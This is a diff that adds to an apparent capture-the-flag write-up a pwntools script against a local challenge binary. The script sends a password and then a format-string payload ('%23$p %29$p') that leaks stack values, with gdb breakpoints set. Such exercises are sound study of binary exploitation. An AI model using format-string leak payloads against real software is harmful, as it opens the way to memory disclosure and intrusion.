@@ -186,3 +186,35 @@ Output:
 <img width="658" height="303" alt="image" src="https://github.com/user-attachments/assets/3a4a78e6-5c82-4ad7-baaa-3c2c8895f0c8" />
 <img width="656" height="314" alt="image" src="https://github.com/user-attachments/assets/b8981381-03f9-4b88-bf3e-74c93fca604e" />
 
+script.py:
+````python
+from pwn import *
+
+context.binary = exe = ELF("./chal", checksec=False)
+context.log_level = "debug"
+
+p = process(exe.path)
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		br *0x4015a0
+		br *0x4015e1
+		br *0x4014dc
+		br *0x401513
+		''')
+GDB()
+
+p.sendlineafter(b">>> ", b"Lost_in_Light")
+
+payload = b"%23$p %29$p"
+
+p.sendlineafter(b">>> ", payload)
+
+p.interactive()
+````
+
+<img width="655" height="441" alt="image" src="https://github.com/user-attachments/assets/925c3fdb-5712-46fc-b26f-c8bb76ac4ce6" />
+
+<img width="657" height="316" alt="image" src="https://github.com/user-attachments/assets/d22e07dc-ee95-48ae-94ff-9de73185c5d7" />
+
+
